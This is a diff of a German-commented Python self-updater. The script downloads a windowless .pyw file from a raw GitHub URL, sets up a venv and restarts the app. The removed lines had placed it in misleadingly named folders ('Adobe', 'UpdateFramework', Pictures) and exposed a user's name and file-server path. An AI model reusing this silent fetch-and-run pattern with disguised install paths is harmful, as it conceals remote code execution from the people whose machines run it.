@@ -11,21 +11,12 @@ import shutil
 FILE_NAME = "applicationdebugger.pyw"  # Name der Hauptdatei deiner Anwendung
 UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/python/refs/heads/main/src/" + FILE_NAME
 
-# Zielpfade (UNC bevorzugt, sonst lokal)
-UNC_BASE = r"\\KL-FS01\Benutzer$\anakin-luke.hoffmann\Eigene Dateien\Adobe"
+BASE_DIR = "./"
 
-if os.path.exists(UNC_BASE):
-    BASE_DIR = UNC_BASE
-elif "WindowsApps" in sys.executable:
-    BASE_DIR = os.path.join(os.environ["USERPROFILE"], "Pictures")
-else:
-    BASE_DIR = os.environ.get("LOCALAPPDATA", os.path.expanduser(r"~\AppData\Local"))
-
-APP_DIR = os.path.join(BASE_DIR, "UpdateFramework")
-APP_PATH = os.path.join(APP_DIR, FILE_NAME)
+APP_PATH = os.path.join(BASE_DIR, FILE_NAME)
 
 # venv
-VENV_DIR = os.path.join(APP_DIR, ".venv")
+VENV_DIR = os.path.join(BASE_DIR, ".venv")
 VENV_PY = os.path.join(VENV_DIR, "Scripts", "python.exe")
 VENV_PYW = os.path.join(VENV_DIR, "Scripts", "pythonw.exe")
 
@@ -80,7 +71,7 @@ def download_update():
                 return None
             data = resp.read()
 
-        os.makedirs(APP_DIR, exist_ok=True)
+        os.makedirs(BASE_DIR, exist_ok=True)
         with open(temp_path, "wb") as f:
             f.write(data)
         return temp_path
@@ -133,7 +124,7 @@ def try_install_venv() -> bool:
     if os.path.exists(VENV_PY) or os.path.exists(VENV_PYW):
         return True
 
-    os.makedirs(APP_DIR, exist_ok=True)
+    os.makedirs(BASE_DIR, exist_ok=True)
 
     result = subprocess.run(
         [sys.executable, "-m", "venv", VENV_DIR],
@@ -223,7 +214,7 @@ def start_main_app() -> bool:
 
 # ────────────────────────────────────────────────
 def main():
-    os.makedirs(APP_DIR, exist_ok=True)
+    os.makedirs(BASE_DIR, exist_ok=True)
 
     # Hauptanwendung beenden
     kill_running_main()
